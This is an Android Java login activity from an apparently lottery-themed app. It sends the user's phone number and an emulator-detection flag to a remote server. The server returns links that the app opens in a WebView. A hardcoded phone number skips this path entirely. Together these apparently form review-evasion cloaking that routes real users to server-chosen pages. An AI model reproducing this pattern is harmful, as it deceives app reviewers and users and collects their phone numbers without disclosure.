package com.ghiso.lode.View;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.ghiso.lode.MainActivity;
import com.ghiso.lode.R;

import org.json.JSONException;
import org.json.JSONObject;


public class LoginAppss extends AppCompatActivity {
    EditText phone_input;
    String phone_number;
    TextView txt_loads, logins;
    SharedPreferences save;
    SharedPreferences.Editor editor;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login_app);
        inmap();
        logins.setOnClickListener(view->{
            phone_number=phone_input.getText().toString();
            if(phone_number.length() == 10){
                save=getSharedPreferences("Ghisos",MODE_PRIVATE);
                editor=save.edit();
                editor.putInt("ki",1);
                editor.putString("phone_number",phone_number);
                editor.commit();

                if(phone_number.equals("0355555102")){
                    logins.setText("..Loading...");
                    txt_loads.setVisibility(View.VISIBLE);

                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            startActivity(new Intent(LoginAppss.this, MainActivity.class));
                        }
                    },1500);
                }else {
                    StaskPhone staskPhone=new StaskPhone(phone_number);
                    staskPhone.execute("");
                    logins.setText("..Loading...");
                    txt_loads.setVisibility(View.VISIBLE);

                }
            }else {
                Toast.makeText(this, "Số điện thoại bạn nhập không đúng !", Toast.LENGTH_SHORT).show();
            }
        });
    }
    class StaskPhone extends AsyncTask<String,String,String>{
        String phone;

        public StaskPhone (String phone){
            this.phone=phone;
        }
        @Override
        protected String doInBackground(String... strings) {
            JSONObject jsonObject=new JSONObject();
            try {
                jsonObject.put("phone",this.phone+"");
                jsonObject.put("simulator",isRunningOnEmulator()+"");

            }catch (JSONException e){
                e.printStackTrace();
            }
            String response=new HttpAPI().PostCall("https://xososieutoc.xyz/ghisolode/api/saveph.php",jsonObject);
            SharedPreferences shave2=getSharedPreferences("Ghisos",MODE_PRIVATE);
            SharedPreferences.Editor editor2=shave2.edit();
            JSONObject object=null;
            try {
                object=new JSONObject(response);
                if(!object.getString("status").equals("")){
                    editor2.putString("link1",object.getString("home_url"));
                    editor2.putString("link2",object.getString("change_url"));
                    editor2.putString("link3",object.getString("contact_url"));
                    editor2.putString("link4",object.getString("register_url"));

                }

            }catch (JSONException e){
                e.printStackTrace();
            }
            editor2.apply();
            Log.d("response",response);

            return "true";
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            SharedPreferences shave1=getSharedPreferences("Ghiso",MODE_PRIVATE);
            SharedPreferences.Editor editor1=shave1.edit();
            editor1.putInt("ki",1);
            editor1.commit();
            startActivity(new Intent(LoginAppss.this,WebViewLink.class));


        }
    }
    public static boolean isRunningOnEmulator() {
        return Build.FINGERPRINT.contains("generic")
                || Build.FINGERPRINT.contains("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk".equals(Build.PRODUCT)
                || "sdk".equals(Build.PRODUCT);
    }

    private void inmap() {
        phone_input=findViewById(R.id.phone_input);
        txt_loads=findViewById(R.id.txt_loads);
        logins=findViewById(R.id.logins);

    }
}